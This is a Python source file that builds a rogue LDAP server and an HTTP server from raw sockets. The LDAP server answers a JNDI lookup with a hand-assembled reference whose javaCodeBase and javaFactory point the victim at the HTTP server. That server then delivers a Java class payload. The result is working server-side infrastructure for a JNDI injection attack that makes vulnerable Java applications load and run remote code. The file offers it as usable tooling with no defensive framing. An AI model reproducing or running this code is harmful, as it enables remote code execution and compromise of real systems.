import socket


class Sock:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((ip, int(port)))
            s.listen()
            self.connection, _ = s.accept()
            self.handle_connection()
        finally:
            s.close()

    def handle_connection(self):
        raise NotImplementedError()


class HTTB(Sock):
    def __init__(self, ip, port, java_payload):
        self.java_payload = java_payload
        super(HTTB, self).__init__(ip, port)

    def handle_connection(self):
        request = self.connection.recv(8096)
        print("http request")
        header = b'HTTP/1.0 200 OK\nContent-type: application/octet-stream\n\n'
        self.connection.send(header)
        self.connection.send(self.java_payload.payload())


class LDAB(Sock):
    def __init__(self, ip, port, query_name, http_port, java_payload):
        self.query_name = query_name
        self.http_port = http_port
        self.java_payload = java_payload
        super(LDAB, self).__init__(ip, port)

    def handle_connection(self):
        handshake = self.connection.recv(8096)
        print("ldap handshake")
        self.connection.send(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
        query = self.connection.recv(8096)
        print("ldap request")
        self.connection.send(self.make_packet(self.query_name))

    def make_header(self, query_name, records):
        query_name = query_name.encode()
        size_query = bytes([len(query_name)])
        size_b = bytes([len(b"\x04" + size_query + query_name + b"0\x81\x82" + records)])
        size_a = bytes([len(b"\x02\x01\x02d\x81" + size_b + b"\x04" + size_query + query_name + b"0\x81\x82" + records)])
        header = b"0\x81" + size_a + b"\x02\x01\x02d\x81" + size_b + b"\x04" + size_query + query_name + b"0\x81\x82"

        return header

    def make_record(self, key, value):
        size_key = bytes([len(key)])
        size_value = bytes([len(value)])
        size_til_end = bytes([len(b"\x04" + size_value + value)])
        record_length = bytes([len(b"\x04" + size_key + key + b"1" + size_til_end + b"\x04" + size_value + value)])

        record = b"0" + record_length + b"\x04" + size_key + key + b"1" + size_til_end + b"\x04" + size_value + value

        return record

    def make_records(self):
        url = "http://{}:{}/".format(self.ip, self.http_port)
        url = url.encode()
        records = self.make_record(b"javaClassName", self.java_payload.class_name())
        records += self.make_record(b"javaCodeBase", url)
        records += self.make_record(b"objectClass", b"javaNamingReference")
        records += self.make_record(b"javaFactory", self.java_payload.class_name())
        return records

    def make_packet(self, query_name):
        records = self.make_records()
        header = self.make_header(query_name, records)
        packet = header + records + b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return packet
